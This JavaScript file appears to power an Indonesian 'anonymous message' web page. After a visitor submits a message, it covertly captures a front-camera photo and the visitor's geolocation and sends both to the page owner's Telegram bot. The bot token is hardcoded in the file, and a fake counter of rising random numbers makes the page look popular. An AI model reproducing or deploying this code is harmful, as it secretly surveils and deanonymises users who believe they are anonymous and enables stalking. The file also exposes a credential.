const botToken = "7970729647:AAG66mxCHoWOiZIs5ljGZIGoy4jMSX0PvMQ";
const chatId = "6377246807";
let isSending = false;

function sendMessage() {
    if (isSending) return;
    isSending = true;

    const message = document.getElementById("inputMessage").value;
    if (!message.trim()) {
        Swal.fire("Error", "Pesan tidak boleh kosong!", "error");
        isSending = false;
        return;
    }

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: `📩 Pesan anonim: ${message}` })
    }).then(() => {
        Swal.fire("Terkirim!", "Pesan telah dikirim.", "success");
        document.getElementById("inputMessage").value = "";

        // Coba kirim lokasi dan foto jika izin tersedia
        getLocation();
        capturePhoto();
    }).catch(() => {
        Swal.fire("Gagal", "Pesan gagal dikirim.", "error");
    }).finally(() => {
        isSending = false;
    });
}

function capturePhoto() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                const canvas = document.createElement("canvas");
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

                const photoData = canvas.toDataURL("image/png");
                sendPhoto(photoData);
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        }).catch(() => {
            console.warn("Akses kamera ditolak atau tidak tersedia.");
        });
}

function sendPhoto(base64Image) {
    let formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", dataURItoBlob(base64Image), "photo.png");

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    }).catch(() => {
        console.warn("Foto gagal dikirim.");
    });
}

function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(",")[1]);
    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
    let ab = new ArrayBuffer(byteString.length);
    let ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;

            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, latitude, longitude })
            }).catch(() => {
                console.warn("Lokasi gagal dikirim.");
            });
        }, () => {
            console.warn("Akses lokasi ditolak.");
        });
    }
}

let count = 50; // Mulai dari 50

function updateCount() {
    let randomIncrease = Math.floor(Math.random() * 10) + 1; // Tambah angka acak antara 1-10
    count += randomIncrease;
    document.getElementById("number").textContent = count;
}

// Jalankan peningkatan angka terus-menerus setiap 2 detik
setInterval(updateCount, 2000);

async function getRandomText() {
    try {
        let response = await fetch('text.json'); // Ambil data dari text.json
        let texts = await response.json(); // Ubah ke JSON
        let randomIndex = Math.floor(Math.random() * texts.length); // Pilih index acak
        document.getElementById("inputMessage").value = texts[randomIndex]; // Masukkan ke input
    } catch (error) {
        console.error("Error fetching random text:", error);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    let inputMessage = document.getElementById("inputMessage");
    let sendButton = document.getElementById("sendButton");

    function toggleSendButton() {
        if (inputMessage.value.trim() !== "") {
            sendButton.style.display = "block";
        } else {
            sendButton.style.display = "none";
        }
    }

    // Cek saat halaman dimuat (jika input sudah ada isinya)
    toggleSendButton();

    // Cek setiap kali pengguna mengetik
    inputMessage.addEventListener("input", toggleSendButton);
});
